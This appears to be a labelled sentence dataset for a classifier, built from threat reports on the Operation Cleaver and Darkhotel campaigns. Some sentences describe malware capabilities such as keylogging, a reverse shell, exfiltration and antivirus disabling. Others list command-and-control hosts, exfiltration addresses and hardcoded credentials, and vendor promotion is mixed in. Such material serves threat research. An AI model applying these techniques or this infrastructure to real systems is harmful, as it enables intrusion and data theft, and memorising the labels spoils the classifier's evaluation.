The sending is performed by internally developed malware samples such as TinyZBot and Csext in order to exfiltrate information about the infected computer , as well as requested files and keystroke logging information .	1
Messages were sent using an open SMTP relay at BeyondSys.com with the sender email address dyanachear ( at ) beyondsys.com .	1
This allowed the attackers to use infrastructure that was not theirs to exfiltrate information .	1
The known recipient addresses of this information were testmail00001 ( at ) yahoo.com and TerafficAnalyzer ( at ) yahoo .	0
com .	0
In order to deceive anyone reading these emails , they made them appear to be a spam message that most would not think twice about .	0
The subject used is the following : The message used is the following : The files being exfiltrated are added to the email as attachments .	1
SOAP is a sub-protocol communicated via HTTP .	1
In relation to Operation Cleaver , it is used as the command and control protocol for TinyZBot , which was the preferred backdoor , and underwent long-term development .	1
HTTP communications are often used by botnets , but it is uncommon to use a sub-protocol such as SOAP .	1
It is likely that SOAP was used because it is simple to implement in C # , and has the added benefit of blending in with other benign HTTP traffic .	1
As part of TinyZBot 's command and control protocol , files can be exfiltrated over SOAP to the command and control server .	1
For more information about TinyZBot , see the Persistence section .	0
Persistence is the means of maintaining access to a compromised network .	1
There are limitless methods of persistence ; the following are techniques and tools for persistence used by Cleaver .	1
TinyZBot is a backdoor developed in C # .	1
This bot is the longest developed malware we have analyzed from this organization .	0
The earliest known version was compiled in January 2013 and we continued to see new versions being created actively .	0
The purpose of TinyZBot is to gather information from an infected computer as well as maintain and further access into a compromised network .	1
TinyZBot was developed with the clear intention of targeted campaigns .	0
The name TinyZBot is assumed to be referring to this project as a less versatile version of the ZeuS botnet , although it does not exhibit the major browser injection features of ZeuS .	0
To be clear , TinyZBot shares no code with ZeuS or its variants , and is developed in a different programming language .	0
The majority of the code in TinyZBot was created by Cleaver .	0
TinyZBot supports a wide array of features that continually evolved over time .	0
For the evolution of features , see the History section .	0
The following is a list of supported features : The command and control mechanism for TinyZBot utilizes SOAP communicating over HTTP .	1
Potential reasons for using SOAP are : 1 .	0
SOAP-based communications are simple to implement in C # .	0
2 .	0
SOAP traffic could easily be considered benign traffic , as it is not commonly seen in malware .	1
As part of SOAP communications , a URI is specified .	0
This is internal to the sub-protocol , and does not necessarily reflect the URI of the host running the SOAP server ( ASMX file ) .	0
In the case of TinyZBot , and many examples for developing SOAP applications , this URI is tempuri.org .	0
Since the first version of the SOAP-based command and control protocol was implemented , TinyZBot used what is referred to as a '' dynamic password '' .	1
The result of this is a cryptographically hashed version of the server time ( which must be obtained through a SOAP query ) , the TinyZBot 's GUID , and the TinyZBot 's AppUsageID ( campaign identifier ) .	0
For the command and control examples below , red text represents TCP data sent from the TinyZBot infection while blue text represents TCP data sent from the command and control server .	1
The server time lookup query invokes the SOAP command GetServerTime .	0
This is the first query done by a running TinyZBot instance , and needs to be done shortly before most other queries , in order to update the dynamic password .	1
Commands , updates and files to drop and execute are stored as files on the SOAP server , and access is restricted by the AppUsageID as well as the bot GUID .	1
This allows for commands to be sent to all bots for a campaign as well as individual control .	1
The TinyZBot queries the server in order to enumerate all files currently available to it .	1
In order to download the file and parse for commands to execute , the TinyZBot must request the file .	1
The file is downloaded Base64-encoded inside of the SOAP response .	1
The command file downloaded in this example is as follows : The first line is a timestamp of the command .	0
The TinyZBot command parser ignores it .	0
The RUNCMD line requests that cmd.exe be executed , with the command ipconfig /all being redirected to a file in a directory designated for files to be uploaded .	1
The UPLOAD command requests that this file is then uploaded over SOAP to the command and control server .	1
The DELETE command then requests that the file be deleted from the infected system .	1
The following is a list of supported commands that TinyZBot responds to : Commands such as GETINFO are often run on newly infected systems , as they decide whether the infection has hit the correct target .	1
There are additional SOAP commands , but they will not be covered in detail .	0
The following is a list of all the SOAP commands : CheckFileMD5 , GetFile , GetFileList , GetServerTime , UploadFile .	0
TinyZBot is commonly installed using some form of deception .	1
Recent versions use the resume- based methods reported in the Initial Compromise sections .	1
An additional method was used for earlier versions .	0
When early versions of TinyZBot were executed , they opened an image stored in the resource section of the executable and copied the malicious TinyZBot executable to the % AppData % directory .	1
Many of the images identified were of the popular Lebanese singer and actress Haifa Wehbe .	0
The backdoor additionally replaced the original malicious executable with an appropriately named image file and padded the image file with null bytes in order to mirror the original file size .	1
The earliest known version on TinyZBot was compiled on January 27 , 2013 .	0
This early version had very little functionality .	0
It was limited to logging keystroke data , sending emails , and creating a link in the user 's startup folder for persistence .	1
Its method of exfiltrating the logged keystrokes relied upon a hardcoded email address stored in the binary .	1
The sender email address was dyanachear ( at ) beyondsys.com and emails were destined for testmail00001 ( at ) yahoo.com .	0
The message was intended to look like common Viagra spam from China , but would be sent with the keystroke logging data as attachments , as well as system information .	1
The initial version did not provide any means of receiving commands and was obfuscated with SmartAssembly .	1
The following iteration compiled on March 12 , 2013 , only contained minor bug fixes .	0
The next version was compiled on April 24 , 2013 .	0
This version starts to look more like an average bot .	0
A command and control protocol was established , using HTTP and SOAP for the protocol .	1
The command and control server for this version was located at 173.192.144.68/ DefaultWS ( dot ) asmx .	1
This new command and control protocol allowed for the addition of quite a few other features .	0
An update mechanism was added , and could be regularly scheduled , so unassisted periodic update checks were automatically performed .	1
The SOAP API used a dynamic password mechanism , which required the computation of a simple key in order to access certain parts of the API .	0
The email data exfiltration method also underwent modification to be activated at a scheduled interval .	1
There were also some changes , which looked to be bug fixes , such as limiting the number of times sending an email could fail .	0
The next day , April 25 , 2013 , a new version was compiled which allowed for self-deletion .	1
On May 14 , 2013 , we noticed a change which assisted in the identification of active targets .	0
The AppUsageId ( at this point named AppType ) was an identifier used by this organization in order to differentiate between targets infected with TinyZBot , meaning they could effectively run multiple campaigns using the same command and control server and know which target was infected .	1
This also allowed for separate commands to be supplied to different targets without the need for per-bot commands .	1
At this time , the AppUsageId was total0 , but later we observed names , which aligned with active targets .	0
The exfiltration email address was also changed to TerafficAnalyzer ( at ) yahoo.com .	1
On June 17 , 2013 , there was an addition that allowed for the loading of configuration data from the PE 's resources .	0
At this time , it was limited to the exfiltration email address .	0
This version was not obfuscated with SmartAssembly We do not see a new version of TinyZBot until June 7 , 2014 .	0
There are quite a few notable improvements , but nowhere near enough to indicate consistent development on the project for a year .	0
SmartAssembly was reused again .	1
A method was added to detect what security related software is installed .	1
Avira antivirus was specifically targeted and disabled , due to its detection of the new keystroke logger module added in this version .	1
This keystroke logger source is publicly available and referred to as DeadkeyLogger .	1
A new string encryption class is added , but the code was copied and pasted from a Microsoft example .	0
The ability to extract Internet Explorer passwords was added .	1
Clipboard monitoring code was added , but not invoked .	1
The emailing features were removed , but the classes which previously contained them were still present but empty .	0
Many more options were enabled to be loaded from PE resources .	0
The ability to add PE resources was added .	0
Another version was compiled on June 7 , 2014 , with no feature difference .	0
On June 17 , 2014 , we see2the first instance of Binder1 , which is aptly named , as it is a binder .	0
The legitimate application used in this version of Binder1 was compiled on August 22 , 2013 , and is a self-extracting archive of desktop wallpapers , including an image from the game Mirror's Edge .	0
The TinyZBot included was the version compiled on June 7 , 2014 .	0
The version compiled on June 23 , 2014 , added functionality which allowed screenshots of the desktop to be taken .	1
On August 2 , 2014 , we see another version without SmartAssembly obfuscation .	0
A bug fix is made to the keystroke logging method , and clipboard monitoring is enabled .	1
Three items were compiled on August 18 , 2014 .	0
Two of them are TinyZBot binaries , which contain a minor key logging bug fix .	0
The third is a new Binder1 instance , which contains one of the TinyZBot instances compiled that day .	0
The legitimate application included in this binder is called Easyresumecreator and is a legitimate application named EasyRésuméCreatorPro .	0
This version targeted a major Saudi Arabian oil company .	0
From August 23 to August 26 , 2014 , new versions of TinyZBot were compiled with the AppUsageIds targeting major oil and gas companies in Qatar and Kuwait , Ministries of Foreign Affairs in the Persian Gulf , and a major airline holding company in UAE .	0
These versions of TinyZBot moved towards a more modular architecture where each component was in its own .NET	0
assembly .	0
This was presumably done to limit antivirus detection of each individual file as well as allow for dynamic updating of specific modules .	1
All of these were included in their own Binder1 instance , which also dropped Easyresumecreator .	0
There also seem to be improved software engineering practices in many locations .	0
FTP upload support was added , with hardcoded credentials of ano:1 .	1
This FTP upload functionality points to the command and control server , and is invoked by a command in the SOAP command and control channel .	1
These versions have the capability to install as a service .	1
On August 25 , 2014 , the version compiled on August 18 was submitted to VirusTotal in a ZIP archive located at http : //dl.doosan-job ( dot ) com/cv/EasyResumeCreator- v2.0.zip .	0
This indicates that TinyZBot is not only being installed while impersonating a résumé creation suite , but is also impersonating potential employers when distributed .	1
On September 9 , 2014 , a ZIP file containing TinyZBot and a configuration targeting a major US university with its AppUsageId was created .	0
This was discovered on an anonymous FTP server in the same IP range as dl.doosan-job ( dot ) com along with other malware .	0
From September 11 through September 17 , 2014 , some TinyZBot components were compiled , along with a new dropper .	0
This dropper impersonated a tool to submit a résumé to Teledyne .	1
When executed , the user is prompted to enter personal information , and at the end is given a button to submit the résumé to Teledyne , although nothing is actually submitted .	0
While the user enters this information , their machine is infected with TinyZBot .	1
The AppUsageIds for these versions target a major US-based university as well as an Israeli aerospace company .	0
These versions began to include a new method of installing as a service .	1
The service runs with the name Network Connectivity Manager .	0
TinyZBot , as well as some other tools ( Csext , Net Crawler ) initially would not run without a command line parameter set .	0
This was likely to avoid detonation-based detection engines .	1
This command line parameter was opensesemi which is often stored in the application 's code in an obfuscated manner .	0
The binders and droppers for TinyZBot provided this command line argument and others when executing .	0
TinyZBot uses a dynamic mutex .	0
This was accomplished by combining a static preset prefix with the active process ID .	0
This allowed supplemental tools to keep TinyZBot running by enumerating every process and checking if the process ID and mutex prefix existed .	1
If no mutex and process pair was located , another TinyZBot instance would be started .	1
Multiple backdoors were used by this organization .	1
These are scripts or applications that allowed for command or code execution outside of the victim network .	1
Many of their backdoors were web applications , added to web servers , so commands can be executed from a browser or client able to communicate with them .	1
This group includes the results of the Shell Creator mentioned in the Attribution section , as well as ASPX backdoors used by Nesha .	1
A PHP shell was also observed , which also included attribution to Nesha in its hashed password .	1
An ASPX backdoor named Zh0uSh311 was located on live servers as well as recovered fro a staging server .	1
This backdoor does not require authentication , and its use appears to be straightforward .	0
Its functionality breaks down into three fairly standard components : SQL queries , executing commands , and uploading files .	1
This organization utilized backdoors which masqueraded as varying versions of Notepad .	1
They replace the existing Notepad.exe on the infected machine , and when run they call out to a remote server and execute any shell code returned by the remote server .	1
There will be a detailed analysis of these backdoors posted to Cylance 's blog in the future .	0
PVZ is a name for a set of executables used together to create a botnet .	0
The name PVZ was assigned by us as this is one of the few tools this organization has not named themselves .	0
The components are as follows : XYNTService was not developed by the Cleaver team , but instead is a publicly available project which executes an executable as a service .	1
The purpose of PVZ-In is to communicate with a command and control server .	1
Communication is primarily unidirectional , as little information is provided from the bot to its command and control server .	0
The known command and control server is located at http : //kundenpflege . menrad ( dot ) de/js/jquery/default.aspx and the command and control protocol only uses HTTP .	1
The commands as well as infected computer information are transferred in the Content- Disposition HTTP header , making the traffic easy to pass over as benign .	1
When a command is received from the server , the results are stored in a central location on disk that the PVZ tools utilize .	1
Command functionality is limited to executing supplied commands , downloading and executing executables as well as self-updating .	1
The debug file path for PVZ-In is : PVZ-In has been observed using the file name ossisvc.exe .	0
PVZ-Out is the other half of the command and control channel , primarily uploading results of commands and keystroke logging data to a remote server .	1
The known command and control server for PVZ-Out is located at http : //www.gesunddurchsjahr ( dot ) de/tor/default.aspx .	1
Much like PVZ-In , this command and control channel communicates with the Content-Disposition HTTP header , but for file data , POST data is supplied .	1
Data uploaded is often compressed , which can make it more difficult to detect the exfiltration of sensitive information .	1
The debug file path for PVZ-Out is : PVZ-Out has been observed with the file name osppsvc.exe .	0
SYN Flooder is a simple network based denial of service tool .	1
It is a command line utility capable of being invoked by PVZ-In .	1
Targeting information is supplied via command line parameters .	0
The debug file path for SYN Flooder is : SYN Flooder has been observed using the name ossysvc.exe .	0
Logger Module observes the user 's actions and records them to a file .	1
The recorded actions include mouse clicks , active windows , keypresses , as well as clipboard data .	1
The resulting log is written out to a location where PVZ-Out can exfiltrate it to its command and control server .	1
Logger Module has been observed using the name ospcsvc.exe .	0
The following command and control servers for Logger Module have been observed : WndTest is the evolution of the PVZ tool chain into a single executable .	1
The tool chain is minimized down to a command and control communications , keystroke logging , and clipboard monitoring .	1
The command and control still supports upgrading , downloading , and executing of applications , as well as executing batch scripts .	1
WndTest installs as a service and has been observed attempting to impersonate Adobe Report Service .	1
WndTest starts using PHP servers for its command and control server , some of which are listed as defaced sites .	1
We have seen wndTest communicate with the following servers : Csext is a backdoor application developed in C # which runs as a service .	1
Its primary functionality is based on commands supplied by its configuration file .	0
The configuration file is able to store specific commands , which are intended to run at particular times .	0
A recovered configuration is as follows : This configuration executes zhCat to connect back to srv01.microsoftwindowsupdate ( dot ) net ( a deceptive domain owned by this group with falsified Whois data attributing to Microsoft Investor Relations ) with XORed communication using the HTTP protocol on TCP port 443 .	1
This zhCat instance is running cmd.exe , effectively making it a reverse connecting shell .	1
This command runs at 00:29 in the morning , and is killed by taskkill at 00:35 .	1
This gives the attackers a predictable method to regain access to a compromised network if they ever lose access .	1
Csext also has email functionality similar to TinyZBot .	1
This email functionality is used to exfiltrate the results of commands from the command file which can also include requests like gathering user information .	1
We have seen Csext configured to communicate with the following servers : If after reviewing the Indicators of Compromise ( IOC ) listed in Appendix A , you believe your organization to be a victim of Operation Cleaver , we recommend you consider the following course of action : 1 .	1
If inside the United States , contact the Federal Bureau of Investigation ( FBI ) via either your local FBI team or FBI CYWATCH at 1-855-292-3937 or cywatch @ ic.fbi.gov .	0
2 .	0
If outside the United States , contact your local , district , state or federal law enforcement authorities .	0
3 .	0
If you have visibility into the attacks on your company and the tools and expertise to track them down , leverage the IOCs in Appendix A to identify their presence in your network , prevent them from expanding the scope of the compromise , and remove their access immediately .	0
4 .	0
If you do NOT have visibility into the attacks , need help identifying an existing successful compromise in your organization , or more importantly wish to prevent this attack or attacks similar to Operation Cleaver , please contact your security provider .	0
5 .	0
If you wish to contact Cylance for additional details not available in this report , please email opcleaver @ cylance.com .	0
6 .	0
If you would like to learn more about Cylance products and professional services , or discuss how Cylance can mitigate Operation Cleaver 's impact to your organization , please contact us directly .	0
Iran in 2014 can probably be best described as galvanizing .	0
They have long been an '' enemy '' of the west , and the United States in particular , but today 's headlines include a variety of topics from nuclear talks to human rights to terrorism to cyber hacking .	0
Iran continues to be extremely active on the global stage – and thereby on the radar of every superpower .	0
Iran 's cyber sophistication has grown rapidly since the dawn of Stuxnet and they have used hard dollars combined with national pride to help build their cyber army .	0
Few doubt their commitment as a government and nation state to funding and recruiting cyber warriors to infiltrate and damage their enemies .	0
And it has been commonly postulated that almost all activity since 2010 coming out of Iran is associated with retaliation for Stuxnet/Duqu/Flame , which seems natural given the severity of the impact .	0
But they do n't need Stuxnet as motivation to want to hack the world .	0
They have long desired power on the political stage , in particular in the fight for nuclear power autonomy .	0
With the deadlines around the Iranian nuclear discussions pushed to 2015 , the attacks may be tied to negotiating power when discussing a pact with the nuclear superpowers of United States , Britain , France , Germany , Russia and China .	0
The inner workings of the Iranian government remain largely a mystery to the western world .	0
However , Iran 's control over its people and the private businesses birthed inside has been well reported .	0
In a 2014 Reuters article , the reporters detail how the secret Iranian organization called '' Setad Ejraiye Farmane Hazrate Emam '' has become one of the most powerful organizations in the country , capable of taking over properties and businesses , buying controlling interests in numerous sectors including finance , oil , telecommunications and many others totaling in upwards of $ 95B .	0
Even the US Treasury has documented an extensive fronting of companies in its report of Execution of Imam Khomeini 's Order ( EIKO ) , which through its two main subsidiaries controls 37 private businesses that are purely front companies for the Iranian government .	0
The history of Iran controlling the usage of the Internet and the very Internet on-ramps into Iran is well known , .	0
They have controlled much of the country 's Internet access to date and have taken over controlling interests in those companies to carry out their work .	0
Given Operation Cleaver's frequent spin-up and take-down of large IP blocks inside the AFRANET IP space inside Iran , and Iran 's well recorded investment in cyber warfare leads us to one simple conclusion : Iran is extremely active in the world of hacking .	0
Operation Cleaver 's intense focus on critical infrastructure companies , especially in South Korea , hints at information sharing or joint operations with Iran 's partner , North Korea .	0
In September , 2012 , Iran signed an extensive agreement for technology cooperation agreement with North Korea , which allows for collaboration on a variety of efforts including IT and security .	0
Operation Cleaver 's carefully selected targets like the oil and gas industry , energy and utility companies , as well as airlines and airports , indicates Iran 's desire to gain deep access into the world 's most critical environments .	0
The end goal of this operation is not known at this time .	0
University student recruitment was hinted at within Operation Cleaver and is consistent with Iran 's reported history of active warrior recruitment in the educational space .	0
Overall , there are many reasons that Iran may be pursuing the targets they did in Operation Cleaver .	0
While we may never truly know , it is important to consider all the above and more when trying to understand the why .	0
After tracking the Operation Cleaver team for over two years , we 're led to the inexorable conclusion : the government of Iran , and particularly the Islamic Revolutionary Guard Corps ( IRGC ) , is backing numerous groups and front entities to attack the world 's critical infrastructure .	0
As security experts in Critical Infrastructure and Key Resources ( CIKR ) , Industrial Control Systems ( ICS ) , Supervisory Control and Data Acquisition ( SCADA ) systems , Building Management Systems ( BMS ) , embedded systems and fixed-function systems , we know how easy they are to hack .	0
We have worked with countless customers and vendors throughout the years to notify them of vulnerabilities , assist with remediatation efforts , and help mitigate threats to their environments .	0
Unfortunately , many critical infrastructure organizations are unable to secure their complex envirnoments against modern attacks .	0
They fall victim to the '' glue flu '' , a malaise of feeling stuck , not wanting to change the status quo for fear they will find problems that they have no idea how to prevent .	0
This '' security anaphylaxis '' spells real disaster .	0
If Operation Cleaver does n't get the world to wake up to what is happening in the silent world of cyber , then perhaps nothing will .	0
Prevention is everything and we should never give up until it's achieved .	0
Challenge your trusted advisors .	0
Challenge your security vendors .	0
Demand better technology and services to detect , respond , but most importantly PREVENT not just contemporary attacks , but future exotic attacks that have yet to be imagined .	0
That is what truly disruptive and innovative technology is .	0
Do n't settle for anything less .	0
We hope that by exposing the Operation Cleaver team to the world , current global critical infrastructure victims can be notified , and prevent future victimization from suffering the consequences of '' status quo '' security .	0
Unlike United Flight 811 , perhaps we can prevent the next disaster .	0
DEFENDERS , NEVER GIVE UP ! In the face of growing and evolving threats , traditional cyber protection technologies are now widely considered inadequate .	0
The only way to regain the upper hand against a new generation of attackers , is to embrace something entirely new .	0
Something that '' thinks '' like an attacker .	0
Something that does n't rely on a trust model or care about hash lookups .	0
Something with a brain .	0
Cylance has eschewed the old foundations that existing cybersecurity products are built upon .	0
Instead , we 've based our approach on mathematics , machine learning , and data science .	0
This algorithmic approach has been proven to detect – and stop – exponentially more modern threats .	0
Leveraging algorithmic risk modeling , CylancePROTECT protects endpoints from everyday viruses , worms , trojans , and spyware , but unlike other security products , CylancePROTECT offers true future-proof protection against the most malicious threats in the world .	0
Advanced Persistent Threats ( APT ) , 0-days , and exotic exploitation techniques are easily detected and halted with little-to-no impact on the end-user .	0
Existing reactive solutions rely on a constant stream of signature updates for threat detection , which is not only costly and inconvenient , but also requires '' sacrificial lambs '' .	0
Only after a previously unseen threat has inflicted damage can the rest of the industry begin to detect it .	0
CylancePROTECT does n't require constant updates or even a network connection to protect against so-called '' previously undetectable '' threats .	0
By identifying and defusing attacks in near real time , before the attack can execute , we can finally do away with the need for a '' patient zero '' .	0
As Richard Stiennon , Chief Research Analyst at IT-Harvest , put it , '' Many vendors are trying to solve the endpoint problem , yet Cylance is the only one using the power of math to stop malware and with more effectiveness and efficiency than current solutions '' .	0
Interested in seeing what CylancePROTECT can do for your organization ? Contact us ! Cylance is one of the fastest growing cybersecurity technology firms in the US .	0
Cylance 's flagship product CylancePROTECT has been adopted by Fortune 500 companies and government agencies across the globe .	0
Cylance was founded by 27-year security industry luminary , Stuart McClure , former Global CTO of McAfee , original founder of Foundstone , and lead author of the international best-selling book Hacking Exposed .	0
In building Cylance , Stuart brought together the best scientific and executive minds from the likes of Cisco , Sourcefire , Google and McAfee .	0
The Cylance board of advisors includes former high-ranking officials from the DHS , the FBI , CIA , and executive titans of business .	0
CylancePROTECT is the only next generation endpoint security product that applies math to mute existing and future malware , viruses , worms , trojans , bots , APTs , 0-days , exploits , adware , spyware and hacking tools – without needing any updates or even a connection to the Internet .	0
The technology is founded on the principle that to fix the industry , you must start from scratch with a way as yet unseen .	0
CylancePROTECT does not rely on signatures of any sort ( blacklist or whitelist ) , behavioral analysis using IOCs , sandboxing analysis , heuristics , micro-virtualization , or dynamic detonation – to detect and prevent malicious files from executing on a target endpoint .	0
While every other endpoint security product must collect a sample , analyze , and write a signature to detect it , CylancePROTECT can detect malware before it executes by statically analyzing features found in the binary itself .	0
Features and Benefits of CylancePROTECT : • Near real time detection of malicious files , even if they 've never been seen in the wild .	0
• Can be used to augment existing endpoint security or be deployed as a complete replacement .	0
• Does not require any signature updates or connection to the cloud .	0
• An easy-to-use web management console with intuitive workflows .	0
• Low-impact endpoint agent .	0
For a demo of CylancePROTECT , contact a Cylance expert today ! Cylance 's Professional Services team is available to assist companies affected by this campaign .	0
Cylance is providing consulting to companies that may have been targeted by these advanced threat actors .	0
Cylance will perform initial triage in order to determine the extent to which your company has been affected by this campaign and work towards establishing a containment strategy .	0
Cylance has two tailored offerings for clients affected by this campaign .	0
The first one includes ICS in our incident response since many companies affected are in the Critical Infrastructure and Key Resources ( CIKR ) vertical .	0
The second offering 's focus is to deploy our proprietary tools and methodologies to detect and mitigate the threats posed by Operation Cleaver .	0
For more information on how the Cylance Professional Services team can assess and respond to attacks like the ones obseved in Operation Cleaver , contact sales @ cylance.com today .	0
Brian is a Sr. Security Researcher for Cylance who joined shortly after the company was established .	0
He is best known for his avid botnet research ( often going by '' botnethunter '' ) and for his novel malware analysis in the A Study in Bots blog series hosted by Cylance .	0
Brian has been a dedicated open-source developer as well as an advocate for public and private anti-botnet operations .	0
Brian actively develops techniques to combat cyber oppositions in positions where resources and leverage are in too limited of supply for conventional means .	0
These techniques , cultivated by Stuart McClure , are the Art of Deterrence .	0
In a previous investigation , Art of Deterrence techniques were successfully used to divert Indonesian hackers motivated by monetary gain away from their highest yielding target group .	0
Brian 's botnet research covers a wide range of topics , from using graph analysis to estimate the amount of ransom that has been paid to a ransomware operator , to utilizing IPv4 scanning techniques to identify and take down point of sale malware panels .	0
Stuart is founder , CEO/President and Chairman of Cylance .	0
Widely recognized for his extensive and in-depth knowledge of security products , Stuart McClure is considered one of the industry 's leading authorities in information security today .	0
A well-published and acclaimed security visionary with currently eleven books in print , McClure is the originating founder of the Hacking Exposed series of books , the most successful security book ever written .	0
From his work , he founded Foundstone in October of 1999 which sold to McAfee in 2004 .	0
McClure brings over two decades of technology and executive leadership with profound technical , operational , and financial experience .	0
Besides Foundstone , Stuart held leadership positions at InfoWorld , Ernst & Young , Kaiser Permanente and a number of government agencies .	0
At McAfee , McClure held numerous positions including SVP/General Manager for the Security Management BU as well as EVP/Global Chief Technology Officer responsible for almost $ 3B worth of revenues .	0
Today , McClure is CEO of Cylance , a disruptive and innovative startup applying math to the problem of security .	0
Cylance products such as CylancePROTECT prevent the most advanced attacks in the world without signatures or sandboxing in realtime on the endpoint .	0
Cylance Services offer highly specialized security services such as incident response , forensics , compromise assessments and advanced penetration assessments for global critical infrastructure .	0
Cylance employees work passionately and tirelessly every day to achieve one goal : Protect the world from cyber attacks .	0
And with their efforts in tracking Operation Cleaver , they have achieved that goal .	0
Our endless thanks to all the Cylancers who contributed to this report .	0
The Operation Cleaver logo , created by Cylance specifically for this report , was inspired by the infamous logo used by the Army of the Guardians of the Islamic Revolution , also known in the west as the Iranian Revolutionary Guard Corps ( IRGC ) .	0
Due to the close connection between the members tracked in this report and the IRGC , it was only fitting to replicate the look and feel of the IRGC 's iconography as the anchor for this document 's branding .	0
The striking visual elements that make up the logo of the IRGC have very specific meanings : • The clenched fist holding a rifle , most likely an AK-47 , represents armed resistance .	0
• The globe symbolizes the IRGC 's worldwide ambitions .	0
• The book , from which the clenched first emanates , represents the Qur'an , connecting the religious ideals on which the group was founded to the armed struggle .	0
• The plants , possibly wheat , represent prosperity .	0
• The name of the group in Persian , the year in which it was founded and a passage from the Qur'an ( 8:60 ) 'And make ready against them all you can of power ' , are represented in text .	0
Several of the visual elements present in the IRGC logo have been carried over to the Operation Cleaver logo including : • A clenched fist , this time holding a cleaver , represents the group 's likely connection with the IRGC as well as armed resistence in general .	0
• The globe in the background represents Operation Cleaver 's worldwide reach .	0
• An ethernet cable connected to the clenched first represents the nature of these attacks ( cyber as opposed to traditional warfare ) .	0
• The hex string translates to '' Think Evil , Do Good '' , a mantra our research team lives by .	0
This Appendix details the IOCs discovered in the investigation of Operation Cleaver .	0
CylancePROTECT prevents the malware used in Operation Cleaver from ever executing .	0
These mutexes are used with the process ID of the malware as a suffix : Listed below are both the MD5 and SHA-256 hashes for samples related to Operation Cleaver .	0
The Darkhotel APT is a threat actor possessing a seemingly inconsistent and con- tradictory set of characteristics , some advanced and some fairly rudimentary .	0
In- hospitably operating for almost a decade , the threat actor is currently active .	0
The actor 's offensive activity can be tied to specific hotel and business center Wi‑Fi and physical connections , some of it is also tied to p2p/file sharing networks , and they have been known to spear-phish targets as well .	1
Darkhotel tools are detected as '' Tapaoux '' , '' Pioneer '' , '' Karba '' , and '' Nemim '' , among other names .	0
The following list presents a set of characteristics for the crew : When unsuspecting guests , including situationally aware corporate executives and high-tech entrepreneurs , travel to a variety of hotels and connect to the internet , they are infected with a rare APT Trojan posing as any one of several major software releases .	1
These might be GoogleToolbar , Adobe Flash , Windows Messenger , etc .	0
This first stage of malware helps the attackers to identify more significant victims , leading to the selective download of more advanced stealing tools .	1
At the hotels , these installs are selectively distributed to targeted individuals .	1
This group of attackers seems to know in advance when these individuals will arrive and depart from their high-end hotels .	0
So , the attackers lay in wait until these travelers arrive and connect to the Internet .	0
The FBI issued advisories about similar hotel incidents ; Australian government offi- cials produced similar , newsworthy accounts when they were infected .	0
While an FBI announcement related to attacks on hotel guests overseas appeared in May 2012 , related Darkhotel samples were already circulating back in 2007 .	0
And available Darkhotel server log data records connections as early as Jan 1 , 2009 .	0
Addition- ally , seeding p2p networks with widely spread malware and 0-day spear-phishing attacks demonstrate that the Darkhotel APT maintains an effective toolset and a long-running operation behind the questionable hospitality it shows its guests .	1
The Darkhotel APT 's precise malware spread was observed in several hotels' networks , where visitors connecting to the hotel 's Wi-Fi were prompted to install software updates to popular software packages .	1
Of course , these packages were really installers for Darkhotel APT 's backdoors , added to legitimate installers from Adobe and Google .	1
Digitally signed Darkhotel backdoors were installed alongside the legitimate packages .	1
The most interesting thing about this delivery method is that the hotels require guests to use their last name and room number to login , yet only a few guests received the Darkhotel package .	1
When visiting the same hotels , our honeypot research systems could n't attract a Darkhotel attack .	0
This data is inconclusive , but it points to misuse of check-in information .	0
The Darkhotel actor maintained an effective intrusion set at hotel networks , providing ample access to unexpected points of attack over several years .	0
These staging points also provide the attackers with access to check-in/check-out and identity information of visitors to high-end and luxury hotels .	0
As a part of an ongoing investigation , our research led us to embedded iframes within hotel networks that redirected individuals ' web browsers to phony install- ers .	1
The attackers were very careful with the placement of these iframes and executables on trusted resources - the hotels ' network login portals themselves .	0
The attackers were also very careful to immediately delete all traces of their tools as soon as an attack was carried out successfully .	1
Those portals are now reviewed , cleaned and undergoing a further review and hardening process .	0
We observed traces of a couple of these incidents in late 2013 and early 2014 on a victim hotel 's network .	0
The attackers set up the environment and hit their individual targets with precision .	1
As soon as their target 's stay was over and the attack-frame was closed , the attackers deleted their iframe placement and backdoored executables from the hotel network .	1
The attackers successfully de- leted traces of their work from earlier attacks in another hotel , but their offensive techniques were the same .	1
Outside reports of the same activity at other hotels provide enough data to confirm the same careful operations there .	0
The attack technique blurs the line between a couple of common APT tactics ; fairly inaccurate '' watering holes '' or '' strategic web compromises '' and more accurate spearphishing techniques .	0
In this case , the Darkhotel attackers wait for their victim to connect to the Internet over the hotel Wi-Fi or the cable in their room .	0
There is a very strong likelihood the targets will connect over these resourc- es , and the attackers rely on that likelihood , much like at a watering hole .	0
But the attackers also maintain truly precise targeting information over the victim 's visit , much like they would know a victim 's email address and content interests in a spearphishing attack .	1
While setting up the attack , the Darkhotel attackers knew the target 's expected arrival and departure times , room number , and full name , among other data .	0
This data enables the attackers to present the malicious iframe precisely to that individual target .	1
So , here we have yet another unique characteristic of this attacker - they employ a loosely certain but highly precise offensive approach .	0
An example of the Darkhotel APT 's indiscriminate malware spreading is dem- onstrated by the way it seeds Japanese p2p sharing sites , where the malware is delivered as a part of a large ( approximately 900mb ) rar archive .	1
The archive is also spread over bittorrent , as detailed below .	1
Darkhotel uses this method to distribute their Karba Trojan .	1
These Japanese archives , translated for Chinese speaking viewers , appear to be sexual in nature , part of an anime sex/military comic scene , exposing the likely interests of potential targets .	0
This Darkhotel package was downloaded over 30,000 times in less than six months .	1
The p2p bittorrent Darkhotel offering is listed here , posted on 2013.11.22 .	0
It was spread throughout 2014 .	0
This torrent serves up an almost 900 mb file .	0
The rar archive decompresses to a directory full of encrypted zips , the associated decryptor and a password file for decrypting the zips .	0
But what looks like the AxDecrypt.exe decryptor is bound to both the true decryptor and the dropper for the Darkhotel Catch.exe Karba Trojan .	1
When a user downloads the torrent and decrypts the zip files , the trojan surrepti- tiously is installed and run on the victim system .	1
Catch.exe , detected as Backdoor.Win32.Agent.dgrn , communicates with the fol- lowing Darkhotel command and control servers : Other examples of this Darkhotel backdoor bound within a shared torrent include adult content Japanese anime and more .	1
There are tens of thousands of down- loads of these individual torrents .	0
The associated Darkhotel backdoor was hosted on bittorrent , emule , etc , under a variety of comic names .	1
Examples include comics and anime offerings .	0
Related Darkhotel command and control server domains include : Darkhotel campaigns involving typical spear-phished Tapaoux implants publicly appeared in bits and pieces several times over the past five years .	1
These subproject efforts targeted defense industrial base ( DIB ) , government , and NGO organizations .	0
Email content on topics like nuclear energy and weaponry capabilities was used as a lure .	0
Early accounts were posted on contagio describing attacks on NGO organi- zations and government policy makers .	0
This spear-phishing activity continues into 2014 .	1
